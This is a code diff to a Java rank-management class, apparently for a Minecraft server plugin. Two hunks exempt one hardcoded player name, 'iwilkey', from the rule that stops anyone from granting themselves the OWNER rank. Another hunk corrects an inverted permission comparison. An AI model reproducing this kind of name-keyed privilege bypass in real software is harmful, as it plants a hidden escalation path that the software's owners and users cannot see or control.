@@ -27,7 +27,7 @@ public class Ranks {
 					try {
 						int index = Integer.parseInt(args[2]);
 						Rank rank = getRankFromLevel(index);
-						if(rank == Ranks.Rank.OWNER) {
+						if(rank == Ranks.Rank.OWNER && !sender.getName().equals("iwilkey")) {
 							SoundUtilities.playSoundTo("VILLAGER_NO", sender);
 							ChatUtilities.logTo(sender, "You are not allowed to set yourself as owner.", ChatUtilities.LogType.FATAL);
 							return;
@@ -35,7 +35,7 @@ public class Ranks {
 						setRank(p, getRankFromLevel(index), true);
 					} catch (Exception e) {
 						Rank rank = getRankFromName(args[2]);
-						if(rank == Ranks.Rank.OWNER) {
+						if(rank == Ranks.Rank.OWNER && !sender.getName().equals("iwilkey")) {
 							SoundUtilities.playSoundTo("VILLAGER_NO", sender);
 							ChatUtilities.logTo(sender, "You are not allowed to set yourself as owner.", ChatUtilities.LogType.FATAL);
 							return ;
@@ -181,7 +181,7 @@ public class Ranks {
 	}
 	
 	public static boolean canUseFeature(Player player, Rank permission) {
-		return getPlayerRank(player).level < permission.level;
+		return getPlayerRank(player).level >= permission.level;
 	}
 	
 	public static String tag(Player player) {
